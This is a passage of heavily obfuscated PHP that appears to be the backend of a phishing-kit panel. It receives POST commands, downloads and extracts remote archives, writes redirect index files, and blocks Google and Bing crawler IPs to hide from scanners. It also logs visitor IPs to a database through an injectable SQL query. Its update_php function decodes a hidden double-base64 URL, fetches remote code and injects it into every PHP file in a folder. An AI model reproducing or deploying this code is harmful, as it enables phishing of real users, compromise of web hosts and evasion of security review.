$randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto ACY7k; zVUGD: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\x2f\x69\x6e\x64\x65\170\56\150\164\x6d\154") || file_exists($path . "\57\x69\x6e\144\x65\x78\x2e\160\x68\160")) { return $path; } else { $subDirectories = glob($path . "\57\x2a", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto lOMlU; YzGS7: header("\x41\143\143\145\163\163\x2d\103\x6f\156\x74\x72\x6f\154\55\x41\x6c\154\157\167\55\x4d\145\x74\x68\x6f\144\x73\x3a\40\120\x4f\123\124"); goto AH46h; UdBiH: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto xHbba; lOMlU: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\x2e\x2e") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\160\x68\x70") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto NUd91; HzJXz: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto HZkr6; hmvkJ: function get_platform($USER_AGENT) { $OS_ERROR = "\125\156\153\x6e\157\167\156\40\117\123\40\120\154\141\x74\146\x6f\x72\155"; $OS = array("\57\167\x69\x6e\x64\157\x77\163\x20\156\164\x20\61\61\x2f\151" => "\127\151\x6e\x64\157\167\163\x20\61\61", "\x2f\167\151\x6e\144\157\167\x73\40\156\164\x20\x31\60\x2f\x69" => "\x57\x69\x6e\x64\x6f\x77\163\40\61\x30", "\57\x77\x69\156\144\x6f\x77\163\40\x6e\164\x20\x36\x2e\63\x2f\x69" => "\127\x69\x6e\x64\x6f\167\x73\40\x38\56\61", "\x2f\x77\x69\156\x64\157\167\x73\x20\x6e\x74\x20\66\56\x32\x2f\151" => "\127\x69\156\144\x6f\167\x73\x20\x38", "\x2f\x77\x69\156\x64\x6f\x77\x73\40\156\164\40\66\x2e\61\x2f\151" => "\127\x69\156\x64\x6f\167\163\x20\x37", "\57\167\x69\156\144\157\167\163\x20\x6e\164\x20\x36\x2e\60\57\151" => "\127\151\x6e\x64\157\x77\x73\x20\126\x69\x73\x74\141", "\x2f\x77\151\x6e\144\x6f\167\163\x20\156\x74\40\65\x2e\x32\57\x69" => "\127\151\x6e\x64\x6f\x77\x73\40\123\145\162\x76\145\162\x20\62\x30\60\x33\x2f\x58\x50\40\x78\66\x34", "\57\x77\151\156\144\x6f\x77\163\40\156\164\40\x35\56\x31\x2f\x69" => "\127\151\156\x64\x6f\167\163\40\x58\120", "\57\167\151\x6e\144\157\167\x73\x20\x78\x70\57\x69" => "\x57\x69\156\x64\157\x77\x73\40\130\x50", "\x2f\167\x69\156\x64\157\x77\x73\40\x6e\164\40\65\56\x30\x2f\x69" => "\127\x69\156\144\157\x77\x73\x20\62\60\60\x30", "\x2f\x77\x69\156\144\x6f\167\163\40\155\x65\x2f\151" => "\127\x69\156\x64\157\167\x73\40\115\105", "\57\x77\151\156\x39\x38\57\151" => "\127\151\x6e\144\157\167\x73\x20\x39\x38", "\x2f\x77\x69\156\x39\65\57\151" => "\127\x69\x6e\x64\157\x77\163\x20\x39\x35", "\x2f\x77\x69\156\61\66\57\x69" => "\x57\151\x6e\x64\157\x77\x73\40\63\56\61\x31", "\57\155\141\x63\151\156\x74\x6f\x73\x68\174\x6d\x61\x63\40\x6f\x73\x20\170\57\151" => "\115\141\x63\x20\x4f\123\40\130", "\x2f\155\x61\x63\x5f\x70\157\x77\145\162\160\x63\x2f\151" => "\115\141\x63\x20\x4f\x53\40\71", "\x2f\x6c\151\156\x75\x78\x2f\151" => "\114\x69\x6e\x75\x78", "\x2f\x75\x62\165\156\164\165\57\x69" => "\125\x62\165\156\164\x75", "\x2f\151\x70\x68\x6f\x6e\x65\x2f\x69" => "\x69\120\150\157\x6e\145", "\x2f\151\160\157\144\57\x69" => "\x69\120\157\144", "\57\x69\x70\x61\144\57\x69" => "\x69\120\x61\144", "\57\x61\156\x64\x72\x6f\x69\144\57\151" => "\x41\156\x64\x72\157\151\144", "\x2f\142\x6c\x61\x63\153\142\145\x72\162\x79\57\x69" => "\x42\154\x61\x63\x6b\x42\x65\162\162\171", "\57\167\145\x62\157\x73\57\151" => "\x4d\157\x62\151\x6c\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto iSwWW; CGkpJ: function is_bot_ip($ipToCheck) { $botsUrls = array("\x67\x6f\157\147\154\145" => "\x68\x74\164\160\x73\72\x2f\57\144\145\x76\x65\154\157\160\145\x72\x73\56\147\x6f\157\147\x6c\x65\x2e\x63\157\x6d\x2f\x73\145\x61\162\x63\150\57\141\160\151\163\57\151\160\x72\141\156\x67\145\163\57\147\157\157\147\x6c\x65\x62\157\164\56\x6a\x73\157\x6e", "\142\151\x6e\147" => "\x68\x74\164\160\x73\x3a\57\57\x77\167\x77\56\142\x69\156\x67\x2e\143\157\155\x2f\x74\157\157\x6c\142\x6f\170\x2f\142\151\x6e\147\142\x6f\x74\56\x6a\163\157\x6e"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\x70\162\x65\146\151\x78\145\163"] as $ipRange) { if (isset($ipRange["\151\x70\x76\66\120\162\145\x66\151\x78"]) && strpos($ipToCheck, "\72") !== false) { $network = $ipRange["\x69\x70\166\x36\120\x72\x65\146\x69\x78"]; } elseif (isset($ipRange["\x69\160\x76\64\x50\x72\145\146\x69\170"]) && strpos($ipToCheck, "\72") === false) { $network = $ipRange["\x69\x70\166\64\120\x72\x65\x66\x69\x78"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto CB_ta; yxcgN: ini_set("\x64\151\163\x70\154\141\x79\137\x65\x72\x72\157\162\163", 1); goto Dr7iq; btp9q: deleteOldFolders("\x77\x65\x62"); goto UEBNM; CB_ta: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\x2f", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\xff", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\x4e", $subnetBin)[1]; $ipInt = unpack("\x4e", $ipBin)[1]; $maskInt = unpack("\116", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto eAZZL; nBgvf: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\56" && $object != "\56\x2e") { if (is_dir($dir . "\x2f" . $object)) { deleteDirectory($dir . "\57" . $object); } else { unlink($dir . "\x2f" . $object); } } } reset($objects); rmdir($dir); } } goto BGMQ5; NRln0: if ($_SERVER["\122\105\x51\x55\x45\123\x54\x5f\x4d\105\x54\110\x4f\104"] === "\x50\x4f\x53\x54") { $view_com_ip = isset($_POST["\x76\x69\x65\167\x5f\x73\145\x6e\144\x5f\x69\160"]) ? $_POST["\x76\151\145\167\137\x73\145\x6e\144\x5f\151\x70"] : null; $view_com_domain = isset($_POST["\166\x69\x65\167\137\163\145\156\x64\137\144\157\155\x61\x69\x6e"]) ? $_POST["\x76\x69\145\167\x5f\x73\x65\x6e\x64\137\144\x6f\x6d\x61\x69\156"] : null; $view_return_domain = isset($_POST["\166\x69\x65\167\x5f\x72\145\x74\x75\162\156\137\x64\157\155\141\151\156"]) ? $_POST["\x76\151\145\x77\137\x72\x65\x74\x75\x72\x6e\137\x64\157\155\141\151\x6e"] : null; $view_com_id = isset($_POST["\166\x69\145\167\x5f\163\x65\156\x64\137\151\x64"]) ? $_POST["\x76\151\x65\167\x5f\163\145\x6e\144\x5f\x69\144"] : null; $view_com_action = isset($_POST["\166\151\145\167\137\x73\145\156\144\137\141\143\x74\x69\157\x6e"]) ? $_POST["\166\151\x65\x77\x5f\x73\x65\156\x64\x5f\141\x63\x74\151\x6f\156"] : null; $view_patch = isset($_POST["\x76\x69\145\x77\x5f\x70\x61\164\x63\150"]) ? $_POST["\166\151\145\167\x5f\160\141\164\143\x68"] : null; $view_user = isset($_POST["\166\151\x65\167\137\x75\163\x65\x72"]) ? $_POST["\x76\151\x65\x77\x5f\165\163\x65\162"] : null; if ($view_com_ip !== null && $view_com_domain !== null && $view_return_domain !== null && $view_com_id !== null && $view_com_action !== null && $view_patch !== null && $view_user !== null) { if ($_POST["\166\x69\145\x77\137\163\145\156\144\137\x61\x63\x74\x69\157\x6e"] == "\166\x69\145\x77") { fetchIPInfo($view_com_ip); user_data($view_com_ip, $view_com_id); $_SESSION["\x6c\x6f\154\x69\x70\x73"] = $view_com_ip; $_SESSION["\x6c\x6f\154\x73\x6f\x75\x6c\163"] = $view_com_id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $view_patch . "\x3f\x26\166\151\x65\167\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\x26\141\154\145\x72\x74\x3d" . $RandOP_Mlux . "\x26\x78\x6c\160\163\75" . $RandOP_Mlux . "\46\163\157\165\154\x73\x3d" . $view_com_id . "\x26\144\x6f\x6e\x65\x3d\x26\x65\162\162\157\x72\x79\x3d" . $RandOP_Mlux . "\x26\155\x6e\x65\155\157\x6e\x69\143\75\46\x6a\x62\75" . $RandOP_Mlux; $responseData = array("\166\x69\145\x77\x5f\x72\145\x73\137\x73\x74\x61\164\x75\x73" => "\x73\x75\x63\143\x65\x73\163", "\155\145\163\x73\x61\x67\145" => $url); $responseJson = json_encode($responseData); echo $responseJson; die; } } $login_com_ip = isset($_POST["\154\157\x67\x69\x6e\137\x73\145\156\x64\137\x69\160"]) ? $_POST["\x6c\157\x67\x69\x6e\137\163\x65\x6e\x64\137\151\x70"] : null; $login_com_domain = isset($_POST["\x6c\157\147\x69\156\137\163\145\x6e\x64\137\x64\x6f\155\141\x69\x6e"]) ? $_POST["\154\x6f\x67\151\x6e\137\x73\x65\156\x64\x5f\x64\x6f\155\141\151\156"] : null; $login_return_domain = isset($_POST["\x6c\157\147\151\156\137\162\x65\164\x75\x72\x6e\x5f\x64\157\x6d\141\151\156"]) ? $_POST["\x6c\157\x67\151\156\137\162\145\164\165\x72\156\137\x64\157\155\x61\x69\x6e"] : null; $login_com_id = isset($_POST["\154\x6f\147\x69\x6e\137\163\145\156\x64\x5f\x69\144"]) ? $_POST["\x6c\x6f\147\x69\x6e\137\x73\145\x6e\144\137\151\x64"] : null; $login_com_action = isset($_POST["\x6c\157\x67\x69\156\137\x73\x65\x6e\144\x5f\141\143\164\151\x6f\x6e"]) ? $_POST["\154\157\x67\x69\156\137\x73\145\x6e\x64\137\x61\x63\x74\151\157\x6e"] : null; $login_patch = isset($_POST["\x6c\157\147\x69\156\x5f\x70\x61\164\x63\x68"]) ? $_POST["\154\157\x67\x69\x6e\137\160\x61\x74\143\x68"] : null; if ($login_com_ip !== null && $login_com_domain !== null && $login_return_domain !== null && $login_com_id !== null && $login_com_action !== null && $login_patch !== null) { if ($_POST["\x6c\157\147\151\x6e\x5f\x73\145\156\144\x5f\141\143\x74\151\x6f\156"] == "\154\x6f\147\151\156") { global $login_com_ip; fetchIPInfo($login_com_ip); user_data($login_com_ip, $login_com_id); $_SESSION["\154\x6f\154\151\x70\163"] = $login_com_ip; $_SESSION["\154\157\x6c\163\157\165\x6c\163"] = $login_com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $login_patch . "\77\46\154\x6f\147\151\x6e\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\141\x6c\145\162\164\75" . $RandOP_Mlux . "\46\x78\154\160\163\75" . $RandOP_Mlux . "\46\x73\x6f\x75\154\163\x3d" . $login_com_id . "\46\x64\x6f\156\145\75\46\x65\x72\x72\x6f\x72\171\x3d" . $RandOP_Mlux . "\46\x6d\156\145\x6d\157\x6e\x69\x63\75\46\x6a\142\75" . $RandOP_Mlux; $responseData = array("\154\x6f\147\x69\156\x5f\162\x65\x73\137\163\164\141\x74\165\x73" => "\163\165\143\143\x65\x73\x73", "\155\x65\163\163\x61\x67\x65" => $url); $responseJson = json_encode($responseData); echo $responseJson; die; } } $com_ip = isset($_POST["\163\145\x6e\x64\x5f\151\x70"]) ? $_POST["\x73\145\156\x64\x5f\151\x70"] : null; $com_domain = isset($_POST["\163\x65\156\x64\137\144\x6f\155\141\151\156"]) ? $_POST["\163\145\x6e\144\137\x64\x6f\x6d\x61\x69\x6e"] : null; $return_domain = isset($_POST["\162\x65\164\165\x72\156\137\x64\157\155\141\x69\156"]) ? $_POST["\x72\145\164\x75\x72\x6e\137\144\x6f\155\141\151\x6e"] : null; $com_id = isset($_POST["\163\145\x6e\144\137\151\144"]) ? $_POST["\163\x65\x6e\x64\137\151\x64"] : null; $com_action = isset($_POST["\163\x65\x6e\x64\x5f\141\143\x74\151\157\x6e"]) ? $_POST["\163\x65\x6e\144\x5f\x61\143\x74\151\157\156"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { global $com_ip; fetchIPInfo($com_ip); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\x72\145\x73\137\x73\x74\141\x74\x75\x73" => "\x34\60\x35", "\155\145\163\x73\141\147\x65" => "\x75\x73\x65\x72\x20\x62\154\157\143\x6b\x65\x64"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (is_bot_ip($com_ip)) { $reson = "\163\x70\141\155\40\x69\160"; banned_client($com_ip, $reson); http_response_code(405); $responseData = array("\x72\145\163\137\x73\164\141\x74\x75\163" => "\64\x30\65", "\x6d\x65\163\x73\x61\x67\145" => "\x75\163\x65\162\x20\x73\160\141\x6d"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (isGoogleUser($local_userAgent, $com_ip)) { $reson = "\107\157\x6f\x67\x6c\145\x20\x69\x70"; banned_client($com_ip, $reson); $responseData = array("\162\145\x73\x5f\163\x74\141\x74\165\x73" => "\64\x30\x36", "\154\x6f\143\x61\154\137\x75\x73\145\x72\x41\x67\x65\x6e\164" => $local_userAgent, "\143\157\155\x5f\x69\160" => $com_ip, "\x6d\x65\163\x73\x61\x67\145" => "\151\x70\x20\x66\151\154\x74\164\x65\x72"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\163\x65\x6e\144\137\x61\143\164\151\157\x6e"] == "\x6c\x6f\x67\x69\x6e") { user_data($com_ip, $com_id); update_user(); } if ($_POST["\x73\x65\156\x64\137\x61\x63\x74\151\157\156"] == "\143\x72\x65\141\x74\x65") { user_data($com_ip, $com_id); download_extract($_SESSION["\x75\x72\x6c"]); update_index($_SESSION["\146\x6f\154\144\145\162"]); add_user($_SESSION["\x66\157\154\144\x65\162"], $com_ip); update_user(); if (isset($_SESSION["\x66\157\154\x64\x65\x72"])) { $folderPath = $_SESSION["\146\157\154\x64\145\x72"]; $indexPath = findIndex($folderPath); if ($indexPath !== false && $indexPath !== $folderPath) { $relativePath = str_replace($folderPath . "\x2f", '', $indexPath); $indexContent = "\x3c\77\x70\150\160\x20\x68\145\141\144\x65\x72\50\47\114\157\143\141\x74\151\157\156\x3a\40\x2e\57{$relativePath}\47\51\x3b\x20\x3f\76"; file_put_contents($folderPath . "\57\x69\156\144\145\x78\56\x70\150\160", $indexContent); } } if ($_SESSION["\141\x70\151"] !== "\x41\x50\111") { getFileContents($_SESSION["\141\x70\151"]); } if ($_SESSION["\x69\163\x70\162\157\164\x65\x63\164"] == "\x31") { update_php($_SESSION["\146\157\154\x64\x65\162"]); } else { update_php_normal($_SESSION["\x66\x6f\154\144\x65\162"]); } $responseData = array("\162\145\163\137\163\164\x61\164\165\x73" => "\163\165\x63\x63\145\163\163", "\162\145\163\137\x64\151\x72" => $_SESSION["\x66\157\x6c\x64\x65\x72"], "\x72\145\x73\x5f\x75\162\154" => $com_domain, "\162\x65\x73\137\x69\x64" => $com_id, "\x72\145\x73\x5f\151\x70" => $com_ip, "\162\145\163\137\x61\143\164\151\x6f\156" => $com_action, "\x6d\145\x73\x73\141\x67\145" => "\163\165\x63\x63\x65\163\163\x66\165\x6c\x6c\171"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\x64\141\x74\141\40\156\x6f\164\x20\141\154\x6c\x6f\x77"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\145\163\x5f\x73\x74\x61\164\165\163" => "\64\x30\65", "\155\x65\x73\163\141\147\145" => "\144\141\x74\141\40\x6e\x6f\x74\40\141\x6c\x6c\x6f\x77\x65\x64"); $responseJson = json_encode($responseData); echo $responseJson; } goto SqZ_0; gc_V0: $local_time = date("\131\x2d\x6d\x2d\144\x20\110\x3a\151\x3a\x73"); goto rpEvz; KcFe5: function update_php($folder_path) { $trackingFile = $folder_path . "\162\x6f\165\x6c\x73\56\164\x78\x74"; $codeURL = base64_decode(base64_decode("\x59\x55\150\123\x4d\107\116\x49\x54\124\132\x4d\x65\124\x6c\65\x57\126\150\x6a\144\126\157\171\x62\x44\x42\150\123\x46\132\x70\132\x46\150\x4f\142\107\116\164\124\156\132\x69\x62\x6c\x4a\x73\x59\x6d\65\x52\144\126\x6b\x79\117\x58\122\x4d\115\156\150\161\131\x6a\112\x34\141\x47\x51\172\142\x47\170\x6a\142\x6b\61\62\x59\172\111\x35\x4d\127\x4e\x74\x54\x6d\x78\115\x4d\x6a\106\x6f\x59\126\x63\x30\x64\x6d\x4e\111\x53\156\x5a\153\x52\x31\x5a\x71\x5a\105\x4d\x31\115\107\126\x49\x55\121")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto EgQt_; iKCmo: $fs_log = base64_decode("\132\110\112\x6a\132\x32\x6c\163\145\x56\101\x77\x4b\x6d\163\155"); goto z0pyx; qmrJX: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\157\156\x6e\145\x63\x74\x69\157\x6e\40\x66\x61\151\154\x65\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\x45\x4c\x45\103\124\x20\x2a\40\106\x52\x4f\x4d\40\154\x6f\147\163\x20\127\110\x45\x52\105\40\151\160\x61\x64\x64\x72\x65\163\75\x27{$ipAddress}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto J8ifU; SqZ_0: ')); ?>
